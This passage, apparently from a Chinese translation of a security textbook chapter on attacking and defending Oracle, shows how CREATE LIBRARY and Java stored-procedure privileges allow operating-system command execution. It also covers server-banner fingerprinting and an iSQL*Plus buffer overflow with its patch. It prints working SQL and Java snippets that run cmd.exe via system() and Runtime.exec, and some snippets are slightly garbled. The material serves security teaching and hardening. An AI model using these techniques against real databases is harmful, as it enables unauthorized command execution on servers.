

# 第 13 章 • Oracle 的攻击与防御

库并导出如 `exec()` 和 `system()` 等函数。一旦库就绪，就需要创建一个 PL/SQL 包来调用由 `msvcrt.dll` 导出的函数之一。首先是“裸壳”包，然后是包体（package body）。在创建包体时，规定了要调用的 C 函数。在这种情况下，包将调用 `system()` 函数。`system()` 函数接受单个参数，该参数是待执行的命令。一旦包创建，就可以按照以下方式调用 `oracmd.exec` 过程：

```
SQL> exec oracmd.exec ('dir c:oracle.txt');
```

通过这种方式，可以通过 Oracle 执行任意操作系统命令。如你所见，`LIBRARY` 权限如果落入错误的人手中将是非常危险的。如果远程数据库用户拥有 `CREATE LIBRARY` 权限，她将能够像我演示的那样创建一个库，并且作为新对象的所有者，她将能够自动执行该过程。

但是数据库服务器中已经定义的 C 库又是怎样的？即使攻击者可能无法 `CREATE` 或 `ALTER` 现有的库，她可能仍然可以使用那里存在的负面影响。要列出已创建的库，运行以下查询：

```
select a.filespec, b.object_name
from library$ a, all_objects b
where length(a.filespec) > 0
and a.obj# = b.object_id
```

在作者的数据库上，返回的库如表 13.1 所示。

# 表 13.1 外部库

| 库 | 名称 |
| --- | --- |
| C:\ora9ias\bin\oraqsmashr.dll | DBMS_SUMADV_LIB |
| C:\win\system32\msvcrt.dll | EXEC_SHELL |
| C:\ora9ias\bin\oraordim9.dll | ORDIMLIBS |
| C:\ora9ias\bin\oraoctxx9.dll | DR$LIB |
| ..\lib\ssxdlap.dll | AUTH_EXT |

通过检查现有的库，没有 `CREATE` 或 `ALTER library` 权限的攻击者仍然可能破坏系统。他可以通过反向工程 DLL 来寻找缓冲区溢出漏洞或格式化字符串漏洞。

# Java 存储过程

扩展 Oracle 数据库服务器功能的另一种方法是使用 Java 存储过程。这会极大影响安全性，因为任何拥有 `CREATE PROCEDURE` 权限的人都可以编写自己的 Java 类。对于特权用户可以执行的操作存在某些限制，但在在此之前，我将检查如何创建 Java 存储过程和函数。

正如前面所述，拥有 `CREATE PROCEDURE` 权限可以为数据库服务器创建一个 Java 类。要列出分配了 `CREATE PROCEDURE` 权限的用户，运行以下查询：

```
select unique grantee from dba_role_privs
where granted_role in
(select grantee from dba_sys_privs
where privilege LIKE 'CREATEPROCEDURE%')
and not in (select role from dba_roles);
```

通常会返回大量的用户。可以使用 `CREATE OR REPLACE JAVA SOURCE` 查询直接在 SQL*PLUS 中输入 Java 源代码。

在这个示例中，默认用户 SCOTT 登录数据库服务器并运行了以下查询：

```
create replace java source named "ScottTest" AS
import java.sql.*;
import java.io.*;
```

```
public class ScottTest
{
    public static String concat(String firstName, String secondString)
    {
        return firstName + secondString;
    }
}
```

一旦执行，Java 源代码将被编译成 Java 类文件，现在就可以从函数或包中它了：

```
create or replace function javatest
(str1 in varchar2, str2 in varchar2)
return varchar2
```

函数创建后，现在可以调用它了：

```
set serveroutput on size 100
declare
temp varchar2(100);
Begin
  temp := javatest('AAA', 'BBB');
dbms_output.put_line(temp);
end;
```

虽然这是一个非常酷的功能，但从安全的角度来看，直接在数据库服务器中编写 Java 代码打开了一个巨大的安全漏洞。例如，在某些情况下可以运行操作系统命令。虽然可能通过 `DBMS_JAVA.GRANT_PERMISSION` 过程授予某些权限，但拥有 `PolicyTable` 相关更新权限的人将能够授予自己这些权利。默认情况下，任何被授予 `JAVA_ADMIN` 角色的人都有这种能力。这些权限也可能授予开发者和其他特权较低的用户。我们假设攻击者想要运行操作系统命令：

```
exec dbms_java.grant_permission('SCOTT','SYS:java.io.FilePermission', 'c:\\windows\system32\cmd.exe', 'execute' );

exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'writeFileDescriptor', ' ');

exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'readFileDescriptor', ' ');
```

运行命令所需的 Java 源代码如下：

```
import java.lang.Runtime;
import java.lang.Process;
import java.io.IOException;
import java.lang.InterruptedException;
```

# Oracle 的攻击与防御 • 第 13 章

```
class JExecCmd {
    public static void main(String args[]) {
        try {
            Process p = Runtime.getRuntime().exec(args[0]);
        } catch (IOException e) {
            System.out.println(e.getMessage());
            e.printStackTrace();
        }
    }
}
```

一旦创建，就可以通过 Java 存储过程执行操作系统命令：`exec jexeccmd ('c:\windows\system32\cmd.exe /c dir > c:\java2.txt')`。此漏洞允许具有危险 Java 权限的远程用户在运行的操作系统上执行命令。

# 攻击 Oracle 应用程序

Oracle 生成了一个 Web 前端来连接到他们的数据库服务器。虽然这个应用程序服务器基于 Apache（Apache 以其安全性闻名），但似乎只要你在其上方叠加任何不错的功能，它就会变得不安全。本节将详细介绍 Oracle 应用程序的问题。

尽管 Oracle Application Server 基于 Apache，但可以通过检查 HTTP 头部中的 `server` 字段来识别 Oracle Application Server。`server` 字段返回有关已安装版本和安装组件的提示，但它没有明确定义补丁级别。

![](img/729efc56f204a2ebffb8295c3a2dfdfb_721_0.png)

9iAS Release 2 的 HTTP 头部横字符串如下：
Oracle9iAS/9.0.2 Oracle HTTP Server

这对于确定尚未安装哪些补丁实际上并没有特别帮助，这是好事，因为你真的不想让攻击者查到这些信息。9iAS Release 1 的横字符串更为典型，如下：

Oracle HTTP Server Powered By Apache/1.3.19

这确实给攻击者提供了一些信息，尽管是有限的。以下是旧版本 Oracle Application Server 的横字符串：

Apache/1.3.12 (Unix) mod_plsq/3.0.9.8b ApacheJServ/1.1 mod_ssl/2.6.4
OpenSSL

注意，这个横字符串给了你一些非常详细的信息，可能有助于帮助攻击。似乎 Oracle 在后来的版本中在这方面变得稍微小明智了一些。

# 9iAS 2 中的漏洞

我在本节中提到的几个漏洞在编写时尚未被修复。再次，Oracle 公司已收到有关这些安全漏洞的通知，他们正在开发一个补丁，预计于 2003 年初发布。一旦补丁可用，关于该漏洞和补丁的更多信息将出现在 http://otn.oracle.com/deploy/security/alerts.html 上。

# iSQL*Plus 中的缓冲区溢出漏洞

iSQL*Plus 是 SQL*Plus 的 Web 版本。此 URL将打开 iSQL*Plus 程序的登录页面：http://oraclewebserver:7777/isqlplus。通过提交一个过长的用户名，栈上保存的返回地址会被覆盖，攻击者可以获得对 Apache 进程执行的控制。这是一个经典的缓冲区溢出漏洞。

Oracle 为一个漏洞提供了补丁。要从 Metalink 下载补丁，请搜索编号为 2581911 的补丁。Oracle 在 http://otn.oracle.com/deploy/security/pdf/2002alert46rev1.pdf 提供了该漏洞的公告。

